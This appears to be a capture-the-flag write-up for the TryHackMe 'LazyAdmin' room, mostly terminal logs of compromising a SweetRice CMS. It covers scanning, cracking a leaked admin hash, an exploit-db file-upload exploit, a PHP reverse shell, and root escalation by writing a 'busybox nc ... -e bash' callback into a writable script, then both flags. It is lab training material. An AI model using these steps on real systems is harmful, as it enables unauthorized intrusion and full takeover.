---
tags:
title: LazyAdmin - Easy (THM)
permalink: /LazyAdmin-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
[Apr 16, 2026 - 19:45:57 (-03)] exegol-thm /workspace # nmap_default  10.66.147.232
[i] Creating /workspace/nmap...
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-16 19:45 -03
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
Initiating Ping Scan at 19:45
Scanning 10.66.147.232 [4 ports]
Completed Ping Scan at 19:45, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:45
Completed Parallel DNS resolution of 1 host. at 19:45, 0.00s elapsed
Initiating SYN Stealth Scan at 19:45
Scanning 10.66.147.232 [1000 ports]
Discovered open port 80/tcp on 10.66.147.232
Discovered open port 22/tcp on 10.66.147.232
Nmap scan report for 10.66.147.232
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.90 seconds
           Raw packets sent: 1689 (74.292KB) | Rcvd: 1688 (67.524KB)
```

```bash
[Apr 16, 2026 - 19:47:49 (-03)] exegol-thm LazyAdmin # feroxbuster -u http:/lazyadmin.thm

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://lazyadmin.thm/
 🚩  In-Scope Url          │ lazyadmin.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6143c http://lazyadmin.thm/icons/ubuntu-logo.png
200      GET      375l      968w    11321c http://lazyadmin.thm/
301      GET        9l       28w      316c http://lazyadmin.thm/content => http://lazyadmin.thm/content/
301      GET        9l       28w      319c http://lazyadmin.thm/content/js => http://lazyadmin.thm/content/js/
301      GET        9l       28w      327c http://lazyadmin.thm/content/attachment => http://lazyadmin.thm/content/attachment/
200      GET        3l        5w      421c http://lazyadmin.thm/content/images/header_background.png
200      GET       12l       25w      225c http://lazyadmin.thm/content/js/init.js
200      GET      109l      187w     3016c http://lazyadmin.thm/content/images/sitemap.xsl
301      GET        9l       28w      320c http://lazyadmin.thm/content/inc => http://lazyadmin.thm/content/inc/                                                                  200      GET       35l       81w      910c http://lazyadmin.thm/content/js/pins.js
200      GET       22l      118w     8083c http://lazyadmin.thm/content/images/action_icon.png
200      GET       50l      205w    18864c http://lazyadmin.thm/content/images/logo.png  200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/db.php       200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/alert.php
200      GET        6l       22w     2657c http://lazyadmin.thm/content/images/captcha.php                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/do_theme.php 200      GET      102l      527w     4809c http://lazyadmin.thm/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
200      GET        1l        8w     8216c http://lazyadmin.thm/content/inc/cache/cache.db                                                                                        301      GET        9l       28w      323c http://lazyadmin.thm/content/images => http://lazyadmin.thm/content/images/                                                            200      GET     1834l     4283w    52263c http://lazyadmin.thm/content/js/SweetRice.js
301      GET        9l       28w      324c http://lazyadmin.thm/content/_themes => http://lazyadmin.thm/content/_themes/
200      GET        5l       26w     1401c http://lazyadmin.thm/content/images/xmlrss.png200      GET       12l       42w     1313c http://lazyadmin.thm/content/images/ajax-loader.gif                                                                                    200      GET        7l       31w     2452c http://lazyadmin.thm/content/images/sweetrice_icon.png                                                                                 200      GET       55l      101w     1054c http://lazyadmin.thm/content/js/function.js   200      GET        1l        6w     3133c http://lazyadmin.thm/content/images/favicon.ico                                                                                        200      GET       38l      217w    17512c http://lazyadmin.thm/content/images/sweetrice.png                                                                                      200      GET       18l       58w     3375c http://lazyadmin.thm/content/images/loading.gif                                                                                        200      GET       61l      277w    26525c http://lazyadmin.thm/content/images/sweetrice.jpg                                                                                      200      GET       11l       11w      204c http://lazyadmin.thm/content/_themes/default/theme.config                                                                              200      GET        0l        0w        0c http://lazyadmin.thm/content/_themes/default/tags.php                                                                                  200      GET        0l        0w        0c http://lazyadmin.thm/content/_themes/default/entry.php                                                                                 200      GET        0l        0w        0c http://lazyadmin.thm/content/_themes/default/head.php                                                                                  200      GET        0l        0w        0c http://lazyadmin.thm/content/_themes/default/comment_form.php                                                                          200      GET        0l        0w        0c http://lazyadmin.thm/content/_themes/default/cat.php                                                                                   200      GET        0l        0w        0c http://lazyadmin.thm/content/_themes/default/main.php                                                                                  200      GET        0l        0w        0c http://lazyadmin.thm/content/_themes/default/sitemap.php                                                                               200      GET        0l        0w        0c http://lazyadmin.thm/content/_themes/default/form.php                                                                                  200      GET        0l        0w        0c http://lazyadmin.thm/content/_themes/default/sidebar.php                                                                               200      GET        0l        0w        0c http://lazyadmin.thm/content/_themes/default/show_comment.php                                                                          200      GET        0l        0w        0c http://lazyadmin.thm/content/_themes/default/foot.php                                                                                  200      GET     1416l     4776w    41204c http://lazyadmin.thm/content/js/excanvas.compiled.js                                                                                   200      GET        3l        8w      498c http://lazyadmin.thm/content/images/captcha.png                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/do_rssfeed.php                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/do_attachment.php                                                                                     200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/do_category.php                                                                                       200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/404.php
200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/rssfeed_category.php
200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/do_comment.php                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/rssfeed.php  200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/rssfeed_entry.php                                                                                     200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/do_ads.php   200      GET        1l        1w        5c http://lazyadmin.thm/content/inc/lastest.txt  200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/install.lock.php                                                                                      200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/close_tip.php200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/do_entry.php 200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/sitemap_xml.php                                                                                       200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/do_tags.php  200      GET        5l       14w      137c http://lazyadmin.thm/content/inc/htaccess.txt 200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/function.php 200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/do_sitemap.php                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/do_home.php  200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/error_report.php                                                                                      200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/init.php     200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/lang/en-us.php                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/lang/big5.php200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/lang/zh-cn.php                                                                                        301      GET        9l       28w      319c http://lazyadmin.thm/content/as => http://lazyadmin.thm/content/as/                                                                    200      GET       79l      150w     2312c http://lazyadmin.thm/content/as/js/media_center.js                                                                                     200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/auth_form.php                                                                                      200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/head.php  200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/attachment.php                                                                                     200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_ad.php 200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_category.php                                                                                    200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/link.php  200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/information.php                                                                                    200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/install.php                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/db_optimizer.php                                                                                   200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/sitemap.php                                                                                        200      GET      107l      445w     3391c http://lazyadmin.thm/content/as/lib/app.sql   200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/db_sqlexecute.php                                                                                  200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_password.php                                                                                    200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_media.php                                                                                       200      GET       88l      248w     2054c http://lazyadmin.thm/content/as/lib/app_sqlite.sql                                                                                     200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_image.php                                                                                       200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/db_to_sqlite.php                                                                                   200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_plugins.php                                                                                     200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_setting.php                                                                                     200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/media.php 200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_update.php
200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/url_redirect.php                                                                                   200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_attachment.php                                                                                  200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_link.php                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/db_import.php                                                                                      200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/htaccess.php                                                                                       200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_htaccess.php                                                                                    200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/view_track.php                                                                                     200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/reset_password.php                                                                                 200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/cat_insert.php                                                                                     200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/install_form.php                                                                                   200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/function.php                                                                                       200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/timezone.php                                                                                       200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_theme.php                                                                                       200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/comment.php                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/site_list.php                                                                                      200      GET      101l      375w     2852c http://lazyadmin.thm/content/as/lib/app_pgsql.sql                                                                                      200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/mysql_backup.php                                                                                   200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/permalinks_custom.php                                                                              200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/category.php                                                                                       200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/theme.php
200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_post.php
200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_sitemap.php                                                                                     200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/main.php  200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_media_center.php                                                                                200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_track.php                                                                                       200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_main.php                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/db_backup.php                                                                                      200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/db_to_pgsql.php                                                                                    200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/foot.php  200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/update.php200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/post_insert.php                                                                                    200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_sites.php                                                                                       200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/forgot_password.php                                                                                200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/transfer_website.php                                                                               200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/sqlite_backup.php                                                                                  200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/pgsql_backup.php                                                                                   200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/view_comment.php                                                                                   200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_cache.php                                                                                       200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/plugin.php200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/media_center.php
200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/db_converter.php                                                                                   200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/site.php  200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_comment.php                                                                                     200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/post.php  200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_data.php                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_urlredirect.php                                                                                 500      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/db_to_mysql.php                                                                                    200      GET      471l     2893w    43328c http://lazyadmin.thm/content/as/lib/license.txt                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/inc/do_lang.php  200      GET     3750l    17676w   482381c http://lazyadmin.thm/content/inc/font/arial.ttf                                                                                        301      GET        9l       28w      322c http://lazyadmin.thm/content/as/js => http://lazyadmin.thm/content/as/js/                                                              200      GET       86l      169w     2573c http://lazyadmin.thm/content/as/js/dashboard.js                                                                                        200      GET       38l       57w      645c http://lazyadmin.thm/content/as/js/function.js301      GET        9l       28w      323c http://lazyadmin.thm/content/as/lib => http://lazyadmin.thm/content/as/lib/                                                            200      GET      125l      292w     2840c http://lazyadmin.thm/content/as/js/BodySort.js200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/license.php                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/tinymce.php                                                                                        200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/permalinks_system.php                                                                              200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/do_plugin.php                                                                                      200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/site_modify.php                                                                                    200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/permalinks_custom_modify.php                                                                       200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/ad.php    200      GET        0l        0w        0c http://lazyadmin.thm/content/as/lib/custom_field.php
```


![[Pasted image 20260416194833.png]]


```bash
[Apr 16, 2026 - 19:50:56 (-03)] exegol-thm LazyAdmin # curl http://lazyadmin.thm/content/js/function.js
/**
 * SweetRice javascript function.
 *
 * @package SweetRice
 * @Dashboard core
 * @since 0.5.4
 */
```

https://nvd.nist.gov/vuln/detail/CVE-2009-4224

```bash
[Apr 16, 2026 - 19:55:16 (-03)] exegol-thm LazyAdmin # feroxbuster -u http:/lazyadmin.thm/content -S 0

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://lazyadmin.thm/content
 🚩  In-Scope Url          │ lazyadmin.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💢  Size Filter           │ 0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      316c http://lazyadmin.thm/content => http://lazyadmin.thm/content/
301      GET        9l       28w      319c http://lazyadmin.thm/content/js => http://lazyadmin.thm/content/js/
200      GET     1834l     4283w    52263c http://lazyadmin.thm/content/js/SweetRice.js
301      GET        9l       28w      324c http://lazyadmin.thm/content/_themes => http://lazyadmin.thm/content/_themes/
301      GET        9l       28w      323c http://lazyadmin.thm/content/images => http://lazyadmin.thm/content/images/
301      GET        9l       28w      320c http://lazyadmin.thm/content/inc => http://lazyadmin.thm/content/inc/
200      GET        5l       14w      137c http://lazyadmin.thm/content/inc/htaccess.txt
200      GET        1l        1w        5c http://lazyadmin.thm/content/inc/lastest.txt
200      GET       22l      118w     8083c http://lazyadmin.thm/content/images/action_icon.png
200      GET        3l        5w      421c http://lazyadmin.thm/content/images/header_background.png
200      GET        5l       26w     1401c http://lazyadmin.thm/content/images/xmlrss.png
200      GET       12l       42w     1313c http://lazyadmin.thm/content/images/ajax-loader.gif
200      GET       11l       11w      204c http://lazyadmin.thm/content/_themes/default/theme.config
200      GET       38l      217w    17512c http://lazyadmin.thm/content/images/sweetrice.png
200      GET        9l       31w     2214c http://lazyadmin.thm/content/images/captcha.php
200      GET        3l        8w      498c http://lazyadmin.thm/content/images/captcha.png
200      GET        1l        6w     3133c http://lazyadmin.thm/content/images/favicon.ico
200      GET       50l      205w    18864c http://lazyadmin.thm/content/images/logo.png
200      GET      109l      187w     3016c http://lazyadmin.thm/content/images/sitemap.xsl
200      GET        1l        8w     8216c http://lazyadmin.thm/content/inc/cache/cache.db
200      GET      102l      527w     4809c http://lazyadmin.thm/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
200      GET      384l      595w     6674c http://lazyadmin.thm/content/_themes/default/css/app.css
200      GET       35l       81w      910c http://lazyadmin.thm/content/js/pins.js
200      GET       55l      101w     1054c http://lazyadmin.thm/content/js/function.js
200      GET       12l       25w      225c http://lazyadmin.thm/content/js/init.js
200      GET        7l       31w     2452c http://lazyadmin.thm/content/images/sweetrice_icon.png
200      GET       18l       58w     3375c http://lazyadmin.thm/content/images/loading.gif
200      GET       61l      277w    26525c http://lazyadmin.thm/content/images/sweetrice.jpg
301      GET        9l       28w      327c http://lazyadmin.thm/content/attachment => http://lazyadmin.thm/content/attachment/
200      GET     1416l     4776w    41204c http://lazyadmin.thm/content/js/excanvas.compiled.js
200      GET     3750l    17676w   482381c http://lazyadmin.thm/content/inc/font/arial.ttf
301      GET        9l       28w      319c http://lazyadmin.thm/content/as => http://lazyadmin.thm/content/as/
301      GET        9l       28w      322c http://lazyadmin.thm/content/as/js => http://lazyadmin.thm/content/as/js/
301      GET        9l       28w      323c http://lazyadmin.thm/content/as/lib => http://lazyadmin.thm/content/as/lib/
200      GET      125l      292w     2840c http://lazyadmin.thm/content/as/js/BodySort.js
200      GET      107l      445w     3391c http://lazyadmin.thm/content/as/lib/app.sql
200      GET      471l     2893w    43328c http://lazyadmin.thm/content/as/lib/license.txt
200      GET       86l      169w     2573c http://lazyadmin.thm/content/as/js/dashboard.js
200      GET       79l      150w     2312c http://lazyadmin.thm/content/as/js/media_center.js
200      GET       38l       57w      645c http://lazyadmin.thm/content/as/js/function.js
200      GET      101l      375w     2852c http://lazyadmin.thm/content/as/lib/app_pgsql.sql
200      GET       88l      248w     2054c http://lazyadmin.thm/content/as/lib/app_sqlite.sql
```

![[Pasted image 20260416200647.png]]

```bash
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

```bash
[Apr 16, 2026 - 20:09:24 (-03)] exegol-thm LazyAdmin # hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: pthread--0x000, 2941/5946 MB (1024 MB allocatable), 10MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

42f749ade7f9e195bf475f37a44cafcb:Password123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 42f749ade7f9e195bf475f37a44cafcb
Time.Started.....: Thu Apr 16 20:09:34 2026 (0 secs)
Time.Estimated...: Thu Apr 16 20:09:34 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1581.7 kH/s (0.48ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 35840/14344384 (0.25%)
Rejected.........: 0/35840 (0.00%)
Restore.Point....: 30720/14344384 (0.21%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: zombies -> siregar

Started: Thu Apr 16 20:09:24 2026
Stopped: Thu Apr 16 20:09:35 2026
```

![[Pasted image 20260416201046.png]]

```bash
[Apr 16, 2026 - 20:10:11 (-03)] exegol-thm LazyAdmin # searchsploit sweetrice
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                | php/webapps/10246.txt
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload  | php/webapps/14184.txt
SweetRice 0.6.7 - Multiple Vulnerabilities             | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download              | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                    | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Cod | php/webapps/40700.html
SweetRice 1.5.1 - Cross-Site Request Forgery           | php/webapps/40692.html
------------------------------------------------------- ---------------------------------
Shellcodes: No Results
[Apr 16, 2026 - 20:10:11 (-03)] exegol-thm LazyAdmin # searchsploit -m php/webapps/40716.py
  Exploit: SweetRice 1.5.1 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/40716
     Path: /opt/tools/exploitdb/exploits/php/webapps/40716.py
    Codes: N/A
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /workspace/Desktop/TryHackMe/LazyAdmin/40716.py
```

```bash
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

Enter The Target URL(Example : localhost.com) : http://lazyadmin.thm/content
Enter Username : manager
Enter Password : Password123
Enter FileName (Example:.htaccess,shell.php5,index.html) : shell.php5
Traceback (most recent call last):
  File "/workspace/Desktop/TryHackMe/LazyAdmin/exploit.py", line 41, in <module>
    file = {'upload[]': open(filename, 'rb')}
                        ^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: 'shell.php5'
[Apr 16, 2026 - 20:11:47 (-03)] exegol-thm LazyAdmin # gen_php_rev 192.168.210.140 4444
[+] Wrote PHP reverse shell to /workspace/Desktop/TryHackMe/LazyAdmin/jazz.php
```


```bash
zip zsln.zip jazz.php
```

![[Pasted image 20260416202909.png]]

![[Pasted image 20260416202921.png]]

```bash
[Apr 16, 2026 - 20:12:33 (-03)] exegol-thm LazyAdmin # nc -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:51180.
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 02:28:10 up 47 min,  0 users,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ script /dev/null -c bash
Script started, file is /dev/null
```

```bash
www-data@THM-Chal:/home/itguy$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

```bash
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

```bash
www-data@THM-Chal:/home/itguy$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

```bash
www-data@THM-Chal:/home/itguy$ ls -l /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

```bash
www-data@THM-Chal:/home/itguy$ echo "busybox nc 192.168.210.140 4444 -e bash" > /etc/copy.sh
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
busybox nc 192.168.210.140 4444 -e bash
```

```bash
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
```

```bash
root@THM-Chal:~# cat root.txt
cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

```bash

```

